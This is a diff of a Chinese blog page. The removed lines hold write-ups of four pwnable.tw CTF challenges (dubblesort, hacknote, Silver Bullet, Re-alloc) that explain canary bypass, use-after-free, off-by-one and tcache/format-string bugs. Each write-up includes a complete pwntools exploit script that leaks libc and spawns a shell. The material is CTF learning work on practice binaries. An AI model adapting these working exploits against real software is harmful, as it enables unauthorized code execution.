-<p>【直接ida搜索字符串找不到该地址，，，可能由于不再字符串段？】<a href="https://hxd.en.softonic.com/" target="_blank" rel="noopener">hex下载地址</a></p>
-<h3 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h3><p>ida里面显示数组情况：<code>int arr_sort; // [esp+1Ch] [ebp-70h]</code>，但是由于esp计算是正确的，ebp不对。</p>
-<p>根据调试得到，覆盖到canary需要0x18个字节。</p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210113102645806.png" alt="image-20210113102645806"></p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210113102755565.png" alt="image-20210113102755565"></p>
-<h4 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h4><p>因为不能覆盖canary，所以要想办法不改变它的值。</p>
-<p>方法是输入“+”或者“-”</p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210113102947391.png" alt="image-20210113102947391"></p>
-<p>发现通过输入“+”、“-”并不会修改它的值。</p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210113103843869.png" alt="image-20210113103843869"></p>
-<p>所以，接下来都填充成system函数，需要9个，接着填上“/bin/sh”的地址。</p>
-<p>注意：【一般canary会小于system函数地址（0xf7开头），而libc中system又在“/bin/sh“之前，所以实现从小到大，sort后不会改变顺序，不能用“||sh”,因为大小小于system的地址。】</p>
-<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf - 8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./dubblesort'</span></span><br><span class="line">p = process(filename)</span><br><span class="line"><span class="comment">#p = remote("chall.pwnable.tw", 10101)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"What your name :"</span>)</span><br><span class="line">p.sendline(<span class="string">"aaaa"</span>*<span class="number">6</span>)</span><br><span class="line">p.recvuntil(<span class="string">"aaaa"</span>*<span class="number">6</span>)</span><br><span class="line">leak_me = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">"leak:"</span>+hex(leak_me))</span><br><span class="line"></span><br><span class="line">libc_base = leak_me - <span class="number">0x1B000a</span></span><br><span class="line">system = libc_base + <span class="number">0x0003a940</span></span><br><span class="line">binsh = libc_base + <span class="number">0x158e8b</span></span><br><span class="line">log.success(<span class="string">"system:"</span>+hex(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvuntil("numbers do you what to sort :")</span></span><br><span class="line">p.sendline(<span class="string">"35"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_send</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	log.success(<span class="string">"idx:"</span>+str(idx))</span><br><span class="line">	p.recvuntil(str(idx)+<span class="string">" number : "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">	print(i)</span><br><span class="line">	my_send(i,str(i))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">my_send(<span class="number">24</span>,<span class="string">"+"</span>)<span class="comment">#canary</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">	my_send(int(<span class="number">25</span>+i),str(system))</span><br><span class="line">my_send(<span class="number">34</span>,str(binsh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p>参考：</p>
-<ol>
-<li><a href="https://www.freebuf.com/articles/others-articles/134271.html" target="_blank" rel="noopener">pwnable.tw刷题之dubblesort</a></li>
-</ol>
-<h2 id="hacknote"><a href="#hacknote" class="headerlink" title="hacknote"></a>hacknote</h2><blockquote>
-<p>简单的堆题，uaf（类似于hitcon的uaf）</p>
-<p>难点在于libc没有字符串’/bin/sh’，解决方法在于直接将字符串“||sh”作为字符串地址传入即可。</p>
-</blockquote>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210110205251966.png" alt="image-20210110205251966"></p>
-<p>打印内容的语句，能否打印是判断该idx的ptr[i]是否存在</p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210110205533787.png" alt="image-20210110205533787"></p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210110205601001.png" alt="image-20210110205601001"></p>
-<p>首先修改参数为got表地址，泄漏libc基址，然后修改函数地址为system，后面为“||sh”</p>
-<h3 id="system-getshell参数"><a href="#system-getshell参数" class="headerlink" title="system getshell参数"></a>system getshell参数</h3><ol>
-<li>‘/bin/sh’字符串地址</li>
-<li>‘sh’字符串地址</li>
-<li>‘||sh’字符串（感觉非常有用，，，哈哈哈）</li>
-</ol>
-<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./hacknote_4'</span></span><br><span class="line">p = process(filename)</span><br><span class="line">p=remote(<span class="string">"chall.pwnable.tw"</span>,<span class="number">10102</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./hacknote_4"</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Note size :"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	<span class="comment">#p.recvuntil("Your choice :")</span></span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#申请两个非0大小的块(而且要一样，不然不好使【不知道为什么，大佬教教我。。。】)</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x38</span>,<span class="string">'bbbb'</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)<span class="comment">#0</span></span><br><span class="line">delete(<span class="number">1</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将两个块的头malloc，其中一个还是ptr[i]，另一个0x8大小的作为数据区</span></span><br><span class="line">add(<span class="number">0x8</span>,p32(<span class="number">0x0804862b</span>)+p32(elf.got[<span class="string">'atoi'</span>]))<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#因为原先两个ptr[i]都申请回来了，所以可以将上面前四个字节作为函数，后四个字节作为参数地址。</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">atoi_addr = (u32(p.recv()[:<span class="number">4</span>]))</span><br><span class="line">log.success(<span class="string">"atoi:"</span>+str(atoi_addr))</span><br><span class="line"></span><br><span class="line">libc_base = (atoi_addr) - (libc.symbols[<span class="string">'atoi'</span>])</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"system:"</span>+hex(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#因为没有edit函数，所以先delete再add做修改。</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x8</span>,p32(system_addr)+<span class="string">'||sh'</span>)<span class="comment">#3</span></span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#调用</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="Silver-Bullet"><a href="#Silver-Bullet" class="headerlink" title="Silver Bullet"></a>Silver Bullet</h2><blockquote>
-<p>off by one修改大小，造成栈溢出。</p>
-<p>程序流程，分别是创建，edit修改（使用了strncat）和根据长度减去hp，可以退出循环</p>
-</blockquote>
-<h3 id="strncat"><a href="#strncat" class="headerlink" title="strncat"></a>strncat</h3><p><strong>原型</strong></p>
-<p><code>char \* strncat(char *dest, const char *src, size_t n);</code></p>
-<ul>
-<li>dest指向目标字符串</li>
-<li>src为指向源字符串。</li>
-</ul>
-<p>strncat()会将dest字符串最后的’\0’覆盖掉，字符追加完成后，再追加’\0’。</p>
-<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210115105743970.png" alt="image-20210115105743970"></p>
-<p>因为数据最大是0，所以<code>*((_DWORD *)s + 12) = v2;</code>刚好在数据相邻后面的位置上。</p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210115110048753.png" alt="image-20210115110048753"></p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210115110545658.png" alt="image-20210115110545658"></p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210115110401451.png" alt="image-20210115110401451"></p>
-<p>所以，如果第一次输入40个数据，第二次输入8，那么数据长度变为8，还可以继续输入，造成栈溢出</p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210115111613400.png" alt="image-20210115111613400"></p>
-<p>但是要程序返回的话，要需要返回，只有beat函数里面win才能return 0</p>
-<p><img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210115112152972.png" alt="image-20210115112152972"></p>
-<p>所以覆盖长度大于<img src="/2021/01/09/pwnable-tw%E8%AE%B0%E5%BD%95-%E5%89%8D%E5%85%AB%E9%A2%98/image-20210115112229004.png" alt="image-20210115112229004">，接着覆盖返回地址为输出函数，泄漏got表信息，得到基址，计算system和‘/bin/sh’地址，覆盖返回地址的返回地址为main函数，再次执行覆盖长度，填充返回地址即可得到shell。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#mobile</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">'./silver_bullet'</span></span><br><span class="line">p = process(filename)</span><br><span class="line"><span class="comment">#p = remote("chall.pwnable.tw",10103)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./silver_bullet"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(content)</span>:</span></span><br><span class="line">	<span class="comment">#cmd(1)</span></span><br><span class="line">	p.sendline(str(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">"Give me your description of bullet :"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(content)</span>:</span></span><br><span class="line">	cmd(<span class="number">2</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Give me your another description of bullet :"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line">add(<span class="string">"a"</span>*<span class="number">40</span>)</span><br><span class="line">edit(<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#off by one</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x08048954</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'\xff'</span>*<span class="number">7</span>+p32(puts_plt)+p32(main)+p32(puts_got)<span class="comment">#覆盖长度、返回地址为输出函数</span></span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">3</span>)<span class="comment">#win，return 0</span></span><br><span class="line">p.recvuntil(<span class="string">"Oh ! You win !!\n"</span>)</span><br><span class="line">puts_addr = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">"puts:"</span>+hex(puts_addr))<span class="comment">#得到puts的got表信息</span></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二次main函数</span></span><br><span class="line">add(<span class="string">"a"</span>*<span class="number">40</span>)<span class="comment">#再次覆盖长度</span></span><br><span class="line">edit(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">payload = <span class="string">'\xff'</span>*<span class="number">7</span>+p32(system)+p32(main)+p32(binsh)<span class="comment">#覆盖返回地址为system</span></span><br><span class="line">edit(payload)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<h2 id="Re-alloc"><a href="#Re-alloc" class="headerlink" title="Re-alloc"></a>Re-alloc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> (sys.argv[<span class="number">1</span>] == <span class="string">'DEBUG'</span> <span class="keyword">or</span> sys.argv[<span class="number">1</span>] == <span class="string">'debug'</span>):</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	p = process(<span class="string">'./re-alloc'</span>)</span><br><span class="line">	elf = ELF(<span class="string">'./re-alloc'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">"chall.pwnable.tw"</span>,<span class="string">"10106"</span>)</span><br><span class="line">	elf = ELF(<span class="string">'./re-alloc'</span>)</span><br><span class="line">	libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr=<span class="number">0</span>,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"breakpoint_addr --&gt; "</span> + hex(text_base + <span class="number">0x202040</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr))) </span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">sda = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(name,addr)</span>:</span></span><br><span class="line">	log.info(name + <span class="string">" --&gt; %s"</span>,hex(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>	<span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">	sla(<span class="string">"choice: "</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>	<span class="title">add</span><span class="params">(idx,size,data)</span>:</span></span><br><span class="line">	choice(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">	sla(<span class="string">"Size:"</span>,str(size))</span><br><span class="line">	sda(<span class="string">"Data:"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>	<span class="title">realloc</span><span class="params">(idx,size,data=<span class="string">''</span>)</span>:</span></span><br><span class="line">	choice(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line">	sla(<span class="string">"Size:"</span>,str(size))</span><br><span class="line">	<span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">		sda(<span class="string">"Data:"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>	<span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	choice(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">8</span>,<span class="string">"hello"</span>)</span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0</span>)<span class="comment">#free了，但没有置零</span></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">8</span>,p64(elf.got[<span class="string">'atoll'</span>]))<span class="comment">#对free的块直接修改</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">8</span>,<span class="string">'n0va'</span>)<span class="comment">#将上面的块申请回来</span></span><br><span class="line">realloc(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">'aaa'</span>)<span class="comment">#修改大小为0x31</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x20</span>,p64(elf.got[<span class="string">'atoll'</span>]))<span class="comment">#chunk0和chunk1内存中指向一个chunk,0的头没有置零，realloc正常。</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">'bbb'</span>)<span class="comment">#1申请回来0x31</span></span><br><span class="line">realloc(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">'bbb'</span>)<span class="comment">#realloc变0x41</span></span><br><span class="line">free(<span class="number">0</span>)<span class="comment">#0free了,头被置零了,0x41进入tcache</span></span><br><span class="line">realloc(<span class="number">1</span>,<span class="number">0x40</span>,<span class="string">'ccc'</span>)<span class="comment">#将1的大小realloc为0x51进入</span></span><br><span class="line">free(<span class="number">1</span>)<span class="comment">#1也free了，0x51进入tcache</span></span><br><span class="line"><span class="comment">#0x20 [  0]: 0x404048 (atoll@got.plt) ◂— ...</span></span><br><span class="line"><span class="comment">#0x30 [  0]: 0x404048 (atoll@got.plt) ◂— ...</span></span><br><span class="line"><span class="comment">#0x40 [  1]: 0x1db4260 ◂— 0x0</span></span><br><span class="line"><span class="comment">#0x50 [  1]: 0x1db4260 ◂— 0x0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,p64(elf.plt[<span class="string">'printf'</span>]))<span class="comment">#修改atollgot表为printf plt</span></span><br><span class="line"><span class="comment"># leak address</span></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x40129D")</span></span><br><span class="line">sla(<span class="string">"Index:"</span>,<span class="string">"%3$p"</span>)<span class="comment">#泄漏信息</span></span><br><span class="line">read_chk = int(ru(<span class="string">'\n'</span>).strip(<span class="string">'\n'</span>),<span class="number">16</span>) - <span class="number">9</span></span><br><span class="line">libc_base = read_chk - libc.symbols[<span class="string">'__read_chk'</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">show(<span class="string">"libc_base: "</span>,libc_base)</span><br><span class="line">show(<span class="string">"system: "</span>,system)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change atoll to system </span></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">sda(<span class="string">"Index:"</span>,<span class="string">'a'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x40129D")</span></span><br><span class="line">sda(<span class="string">"Size:"</span>,<span class="string">'%32c'</span>)</span><br><span class="line">sda(<span class="string">"Data:"</span>,p64(system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">sda(<span class="string">"Index:"</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>参考：<a href="https://www.freebuf.com/news/162929.html" target="_blank" rel="noopener">Pwnable.tw刷题之Silverbullet破解过程分享</a></p>
-
-	
-	</div>
-  <a type="button" href="/2021/01/09/pwnable-tw记录-前八题/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -1407,6 +1175,8 @@ var _hmt = _hmt || [];
 		
 			<li><a href="/categories/专题/">专题<span>3</span></a></li>
 		
+			<li><a href="/categories/分享/">分享<span>1</span></a></li>
+		
 			<li><a href="/categories/基础知识/">基础知识<span>1</span></a></li>
 		
 			<li><a href="/categories/复现/">复现<span>2</span></a></li>
@@ -1428,48 +1198,48 @@ var _hmt = _hmt || [];
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/《操作系统真相还原》/">《操作系统真相还原》<span>1</span></a></li>
+			<li><a href="/tags/出题环境/">出题环境<span>1</span></a></li>
 		
-			<li><a href="/tags/安装/">安装<span>1</span></a></li>
-		
-			<li><a href="/tags/srop/">srop<span>1</span></a></li>
